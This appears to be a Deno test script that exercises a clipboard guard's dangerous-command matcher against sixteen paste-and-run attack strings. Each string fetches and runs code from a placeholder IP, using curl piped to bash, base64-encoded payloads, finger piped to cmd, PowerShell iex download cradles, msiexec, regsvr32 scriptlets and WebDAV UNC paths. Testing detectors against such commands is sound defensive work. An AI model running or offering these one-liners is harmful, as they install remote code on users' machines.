const src = await Deno.readTextFile("src/guards/clipboard.js");
const body = src.slice(src.indexOf("(() => {") + 8, src.lastIndexOf("})();"));
const api = {};
new Function(body.replace(/if \(typeof window !== "undefined"[\s\S]*$/, "") + "\nreturn installClipboardGuard;")()(api);
const cases = [
  "curl -fsSL https://203.0.113.5/a.sh | /bin/bash",
  "curl -fsSL https://203.0.113.5/a.sh | nohup bash",
  "bash <(curl -fsSL https://203.0.113.5/a.sh)",
  "/bin/zsh -c \"$(curl -fsSL https://203.0.113.5/a.sh)\"",
  "/bin/bash -c \"$(echo Y3VybCBodHRwOi8vZXZpbC9hIHwgYmFzaA== | base64 -d)\"",
  "cmd /c \"finger vke@203.0.113.5 | cmd\"",
  "cmd /c start \"\" /min cmd /c \"finger vke@203.0.113.5 | cmd\"",
  "\\\\203.0.113.5@SSL\\DavWWWRoot\\verify.exe",
  "powershell –w hidden –c \"$u='http://203.0.113.5/a';&('i'+'ex')((New-Object Net.WebClient).DownloadString($u))\"",
  "msiexec /qn /i \\\\203.0.113.5@80\\a.msi",
  "regsvr32 /s /n /u /i:\\\\203.0.113.5\\a.sct scrobj.dll",
  "conhost --headless cmd /c \"curl -o %TEMP%\\a.exe http://203.0.113.5/a & %TEMP%\\a.exe\"",
  "curl -o %TEMP%\\a.bat http://203.0.113.5/a.bat",
  "powershell -c \"irm 203.0.113.5/a|iex\"",
  "pwsh -NoP -C \"& ([scriptblock]::Create((irm 203.0.113.5/a)))\"",
  "PoWeRsHeLl -ep bypass -f \\\\203.0.113.5\\s\\a.ps1",
];
for (const c of cases) console.log((api.matchDangerous(c) || "MISSED").padEnd(20), c);
